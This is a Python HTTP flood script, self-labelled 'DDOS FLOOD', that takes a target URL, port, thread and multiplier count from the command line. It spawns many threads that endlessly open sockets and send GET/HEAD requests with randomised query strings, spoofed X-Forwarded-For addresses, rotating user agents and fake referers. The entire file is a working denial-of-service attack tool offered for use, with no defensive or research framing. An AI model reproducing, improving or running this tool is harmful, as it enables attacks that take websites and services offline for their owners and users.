import os, sys, time, socket, random, threading
#import ssl, socks, scapy

with open("requirements.txt", 'w') as file:
	file.write("colorama\nfake-useragent")
try:
	import colorama, fake_useragent
except ModuleNotFoundError:
	sys.exit("\n> pip3 install -r requirements.txt\n")
	
os.system("clear")
ua = fake_useragent.UserAgent()
choice = random.choice
Intn = random.randint
strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"


colorama.init(autoreset=True)

Color = colorama.Fore

Color_list = [
	Color.LIGHTBLUE_EX,
	Color.LIGHTCYAN_EX,
	Color.LIGHTGREEN_EX,
	Color.LIGHTRED_EX
]

acceptall = [
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip, deflate\r\n",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]

referers = [
	"https://www.google.com/search?q=",
	"https://check-host.net/",
	"https://www.facebook.com/",
	"https://www.youtube.com/",
	"https://www.fbi.com/",
	"https://www.bing.com/search?q=",
	"https://r.search.yahoo.com/",
	"https://www.cia.gov/index.html",
	"https://vk.com/profile.php?redirect=",
	"https://www.usatoday.com/search/results?q=",
	"https://help.baidu.com/searchResult?keywords=",
	"https://steamcommunity.com/market/search?q=",
	"https://www.ted.com/search?q=",
	"https://play.google.com/store/search?q=",
	"https://www.qwant.com/search?q=",
	"https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
	"https://www.google.ad/search?q=",
	"https://www.google.ae/search?q=",
	"https://www.google.com.af/search?q=",
	"https://www.google.com.ag/search?q=",
	"https://www.google.com.ai/search?q=",
	"https://www.google.al/search?q=",
	"https://www.google.am/search?q=",
	"https://www.google.co.ao/search?q=",
]

ua_list = [
	ua.ie,
	ua.msie,
	ua.opera,
	ua.random,
	ua.best_browser,
	ua.edge,
	ua.chrome,
	ua.google,
	ua.firefox,
	ua.ff,
	ua.safari
]

try:
	URL = str(sys.argv[1])
	Port = int(sys.argv[2])
	Thread = int(sys.argv[3])
	Multi = int(sys.argv[4])
except IndexError:
	sys.exit(choice(Color_list)+"- DDOS FLOOD\n\nDEVELOPED BY FLOOD\n\nUsage:\npython3 "+sys.argv[0]
+" <URL> <Port> <Thread 500 - 1000> <Multi 300 - 600>\n")


if URL[:7] == "http://":
#	Port = 80
	Host = URL.replace("http://", "")
elif URL[:4] == "www.":
#	Port = 443
	Host = URL.replace("www.", "")
elif URL[:12] == "https://www.":
#	Port = 443
	Host = URL.replace("https://www.", "")
elif URL[:8] == "https://":
#        Port = 443
        Host = URL.replace("https://", "")
else:
#        Port = 80
        Host = URL.replace("http://", "")
        URL = "http://"+str(URL)


def random_data():
	return str(choice(strings)+str(Intn(0, 271400281257))+choice(strings)+str(Intn(0, 271004281257))+choice(
	strings)+choice(strings)+str(Intn(0, 271400281257))+choice(strings)+str(Intn(0, 271004281257))+choice(strings))


def RandomIP():
        Randip = []
        Randip1 = random.randint(1,255)
        Randip2 = random.randint(1,255)
        Randip3 = random.randint(1,255)
        Randip4 = random.randint(1,255)

        Randip.append(Randip1)
        Randip.append(Randip2)
        Randip.append(Randip3)
        Randip.append(Randip4)

        Randip = str(Randip[0])+"."+str(Randip[1])+"."+str(Randip[2])+"."+str(Randip[3])
        return Randip


def flood():
	connection = "Connection: Keep-Alive\r\n"
	accept = choice(acceptall) + "\r\n"
	referer = "Referer: "+choice(referers)+URL+"\r\n"
	connection += "Cache-Control: max-age=0\r\n"
	connection += "pragma: no-cache\r\n"
	connection += "X-Forwarded-For: "+RandomIP()+"\r\n"
	useragent = "User-Agent: "+choice(ua_list)+"\r\n"
#		
	get = "GET "+"/"+"?"+random_data()+" HTTP/1.1\r\nHost: "+Host+"\r\n"
	head = "HEAD "+"/"+"?"+random_data()+" HTTP/1.1\r\nHost: "+Host+"\r\n"

	headers = referer + useragent + accept + connection + "\r\n\r\n"

	request = get + head +  headers
	while True:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.connect((str(Host), int(Port)))
			for x in range(Multi):
				sock.sendall(str.encode(request))
		except socket.error:
			sock.close()

print(choice(Color_list)+"[!] Starting the Attack in 5 Seconds", end="\r")
time.sleep(1)
print(choice(Color_list)+"[!] Starting the Attack in 4 Seconds", end="\r")
time.sleep(1)
print(choice(Color_list)+"[!] Starting the Attack in 3 Seconds", end="\r")
time.sleep(1)
print(choice(Color_list)+"[!] Starting the Attack in 2 Seconds", end="\r")
time.sleep(1)
print(choice(Color_list)+"[!] Starting the Attack in 1 Seconds", end="\r")
time.sleep(1)
print(choice(Color_list)+f"[*] Attack Started to >>> [ {URL}:"+str(Port)+" ]")

for x in range(Thread):
	thread = threading.Thread(target=flood)
	thread.start()
